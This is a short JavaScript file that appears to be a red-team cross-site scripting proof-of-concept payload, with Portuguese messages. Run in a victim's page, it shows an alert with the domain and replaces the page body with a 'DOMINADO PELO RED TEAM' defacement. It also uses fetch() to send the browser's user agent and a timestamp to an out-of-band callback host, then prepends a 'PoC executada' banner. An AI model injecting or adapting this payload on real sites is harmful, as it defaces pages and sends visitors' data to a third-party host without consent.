// redirect_payload_xss_final.js
alert("XSS! Executando em: " + document.domain);

document.body.innerHTML = "<h1 style='color:red;'>DOMINADO PELO RED TEAM</h1>";

fetch("http://d0srgcp2g6i6c3nk11fgtwzj8cd39r1ay.oast.online/?ua=" + encodeURIComponent(navigator.userAgent) + "&time=" + Date.now());

const p = document.createElement("p");
p.innerText = "PoC executada: " + new Date().toLocaleString();
p.style = "background:black;color:lime;font-size:24px;padding:10px;";
document.body.prepend(p);

